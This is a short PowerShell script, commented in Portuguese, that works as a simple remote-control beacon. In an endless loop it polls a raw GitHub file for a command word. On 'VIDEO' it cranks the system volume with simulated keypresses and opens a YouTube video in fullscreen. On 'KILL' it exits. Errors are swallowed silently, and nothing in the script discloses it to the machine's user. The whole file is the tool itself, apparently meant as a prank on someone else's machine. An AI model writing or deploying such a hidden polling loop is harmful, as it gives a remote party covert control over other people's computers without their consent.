$urlOrdem = "https://raw.githubusercontent.com/Thiii123/my-tools/refs/heads/main/payload.ps1"

while($true) {
    try {
        # Baixa a palavra escrita no action.txt
        $comando = (Invoke-WebRequest -Uri $urlOrdem -UseBasicParsing).Content.Trim()

        if ($comando -eq "VIDEO") {
            $obj = New-Object -ComObject WScript.Shell
            for($i=0; $i -le 50; $i++) { $obj.SendKeys([char]175) }
            start "https://www.youtube.com/watch?v=qHoAEWK59nE&list=RDqHoAEWK59nE&start_radio=1"
            Start-Sleep -Seconds 5
            $obj.SendKeys('f')
            
            # Opcional: faz o script parar após executar uma vez
            exit 
        }
        elseif ($comando -eq "KILL") {
            exit # Fecha o script remotamente
        }
    } catch { }
    
    Start-Sleep -Seconds 10 # Verifica a cada 10 segundos
}
